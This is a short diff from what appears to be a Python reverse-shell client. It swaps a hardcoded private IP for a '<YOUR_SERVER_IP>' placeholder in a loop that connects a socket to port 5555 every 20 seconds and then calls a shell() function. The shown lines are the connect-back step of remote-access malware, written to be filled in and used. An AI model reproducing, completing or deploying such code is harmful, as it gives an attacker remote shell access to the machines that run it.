@@ -40,7 +40,7 @@ def connection():
     while True:
         time.sleep(20) 
         try:
-            s.connect(('192.168.1.219', 5555))  # Server IP
+            s.connect(('<YOUR_SERVER_IP>', 5555))  # Replace with your server IP
             shell()
             s.close()
             break
